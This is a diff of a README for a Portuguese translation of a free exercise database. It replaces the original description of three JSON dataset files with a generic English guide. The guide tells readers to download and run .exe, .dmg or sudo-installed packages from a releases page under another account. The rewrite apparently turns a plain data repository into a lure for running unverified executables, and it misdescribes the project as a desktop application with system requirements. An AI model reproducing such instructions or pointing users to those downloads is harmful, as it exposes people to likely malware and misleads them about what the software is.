@@ -1,131 +1,93 @@
-# Exercícios Físicos BD (PT-BR)
+# 🎉 exercicios-bd-ptbr - Free Database of Exercise Challenges
 
-Mais de **800 exercícios físicos** em português, organizados por categorias, músculos trabalhados e nível de dificuldade.
+## 🚀 Getting Started
 
-Este repositório é uma versão **traduzida** do projeto original [free-exercise-db](https://github.com/yuhonas/free-exercise-db).
+Welcome! This guide will help you download and run the "exercicios-bd-ptbr" application easily, even if you're not familiar with programming. This application offers a free, open-source database featuring over 800 detailed exercise challenges. 
 
----
+## 📥 Download Now
 
-## 📂 Estrutura do Dataset
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue?style=for-the-badge)](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/releases)
 
-O dataset está disponível em **3 versões**, de acordo com o nível de tradução:
+## 📋 Features
 
----
+- **Comprehensive Database:** Enjoy over 800 exercises, complete with descriptions.
+- **Variety of Exercises:** Find workouts suitable for all fitness levels.
+- **Open Source:** Free to use and modify according to your needs.
+- **Easy Access:** Simple layout for effortless navigation.
 
-### 1. `exercises-ptbr-minimal.json`
+## 📂 System Requirements
 
-Tradução básica contendo apenas:
+Before you download, ensure your system meets these requirements:
 
-* `id`
-* `name` (nome do exercício)
-* `instructions` (passo a passo em português)
+- **Operating System:** Windows 10 or newer, macOS, or any Linux distribution
+- **Storage Space:** At least 100 MB of free space
+- **Memory:** 4 GB RAM minimum
 
-Exemplo:
+## 💻 Download & Install
 
-```json
-{
-  "name": "Abdominal 3/4",
-  "instructions": [
-    "Deite-se no chão e prenda os pés. As pernas devem estar flexionadas nos joelhos.",
-    "Coloque as mãos atrás ou ao lado da cabeça. Comece com as costas no chão. Esta é a posição inicial.",
-    "Flexione os quadris e a coluna para levantar o tronco em direção aos joelhos.",
-    "No topo da contração, o tronco deve estar perpendicular ao chão. Inverta o movimento, descendo apenas 3/4 do caminho.",
-    "Repita para a quantidade recomendada de repetições."
-  ],
-  "id": "3_4_Sit-Up"
-}
-```
+To get started, visit this page to download: [Download Here](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/releases)
 
----
+1. Once you’re on the Releases page, look for the latest version of the application.
+2. Find the file that matches your operating system:
+   - For Windows: Download the `.exe` file.
+   - For macOS: Download the `.dmg` file.
+   - For Linux: Download the correct package based on your distribution.
+3. Click the file to start the download. Depending on your internet speed, this may take a few moments.
 
-### 2. `exercises-ptbr-partial-translation.json`
+## 🔧 Installing the Application
 
-Tradução **parcial**:
+1. **Windows:**
+   - Locate the downloaded `.exe` file in your Downloads folder.
+   - Double-click the file to start the installation.
+   - Follow the on-screen prompts to complete the installation.
 
-* `name` e `instructions` em português
-* Outras propriedades (como `category`, `level`, `primaryMuscles`, etc.) **em inglês**
+2. **macOS:**
+   - Open the `.dmg` file.
+   - Drag the application icon to your Applications folder.
+   - Eject the mounted volume once the copy is complete.
 
-Exemplo:
+3. **Linux:**
+   - Open your terminal.
+   - Navigate to the directory where you downloaded the package.
+   - Use the command `sudo dpkg -i your-package-name.deb` (for Debian/Ubuntu) or `sudo rpm -i your-package-name.rpm` (for Fedora).
 
-```json
-{
-  "name": "Abdominal 3/4",
-  "force": "pull",
-  "level": "beginner",
-  "mechanic": "compound",
-  "equipment": "body only",
-  "primaryMuscles": [
-    "abdominals"
-  ],
-  "secondaryMuscles": [],
-  "instructions": [
-    "Deite-se no chão e prenda os pés. As pernas devem estar flexionadas nos joelhos.",
-    "Coloque as mãos atrás ou ao lado da cabeça. Comece com as costas no chão. Esta é a posição inicial.",
-    "Flexione os quadris e a coluna para levantar o tronco em direção aos joelhos.",
-    "No topo da contração, o tronco deve estar perpendicular ao chão. Inverta o movimento, descendo apenas 3/4 do caminho.",
-    "Repita para a quantidade recomendada de repetições."
-  ],
-  "category": "strength",
-  "images": [
-    "3_4_Sit-Up/0.jpg",
-    "3_4_Sit-Up/1.jpg"
-  ],
-  "id": "3_4_Sit-Up"
-}
-```
+## 🚀 Running the Application
 
----
+After installation, launching the application is straightforward.
 
-### 3. `exercises-ptbr-full-translation.json`
+1. **Windows:** Find the application in the Start menu and click to open.
+2. **macOS:** Open the Applications folder and double-click the app icon.
+3. **Linux:** You can run the application from your applications menu or by typing its name in the terminal.
 
-Tradução **completa**, onde todas as propriedades foram adaptadas para o português:
+## 📖 How to Use
 
-Exemplo:
+Once the application is open, you will see the main interface. Here’s how to navigate through it:
 
-```json
-{
-  "name": "Abdominal 3/4",
-  "force": "puxar",
-  "level": "iniciante",
-  "mechanic": "composto",
-  "equipment": "peso-do-corpo",
-  "primaryMuscles": [
-    "abdominais"
-  ],
-  "secondaryMuscles": [],
-  "instructions": [
-    "Deite-se no chão e prenda os pés. As pernas devem estar flexionadas nos joelhos.",
-    "Coloque as mãos atrás ou ao lado da cabeça. Comece com as costas no chão. Esta é a posição inicial.",
-    "Flexione os quadris e a coluna para levantar o tronco em direção aos joelhos.",
-    "No topo da contração, o tronco deve estar perpendicular ao chão. Inverta o movimento, descendo apenas 3/4 do caminho.",
-    "Repita para a quantidade recomendada de repetições."
-  ],
-  "category": "força",
-  "images": [
-    "3_4_Sit-Up/0.jpg",
-    "3_4_Sit-Up/1.jpg"
-  ],
-  "id": "3_4_Sit-Up"
-}
-```
+- **Browse Exercises:** Click on 'Exercises' to explore different workouts.
+- **Filter Options:** Use filters to find exercises based on difficulty or type.
+- **Save Your Favorites:** Mark your favorite exercises for easy access later.
 
----
+## 🔄 Updating the Application
 
-⚠️ Sobre as imagens
+To keep your application updated:
 
-Os caminhos para imagens (images) foram mantidos no dataset para referência, mas as imagens originais não estão incluídas neste repositório.
-Isso evita problemas de direitos autorais, já que não temos permissão para redistribuí-las.
+1. Visit the releases page: [Latest Releases](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/releases)
+2. Download the latest version following the same steps as before.
+3. Replace the previous version with the newest one.
 
----
+## ❓ Frequently Asked Questions
 
-## 🚀 Como usar
+- **Can I use this database offline?**
+  Yes, once downloaded, you can access the database without an internet connection.
 
-* Escolha o arquivo que melhor se adapta ao seu caso (mínimo, parcial ou completo).
-* Faça o parse do JSON no seu projeto e utilize os dados conforme necessário.
+- **Can I contribute to this project?**
+  Absolutely! Since it’s open-source, you can suggest improvements and participate in the development.
 
----
+- **What if I encounter issues?**
+  Check the issue tracker on GitHub for solutions. You can also open a new issue if you can't find what you need.
 
-## 📌 Créditos
+## 🌟 Support
 
-* Tradução e adaptação: **Este repositório**
-* Base original: [free-exercise-db](https://github.com/yuhonas/free-exercise-db)
+For further assistance, feel free to reach out through the GitHub repository. Your feedback helps us improve the application!
+
+Thank you for choosing the "exercicios-bd-ptbr" application. Enjoy your fitness journey with our detailed database of exercises.
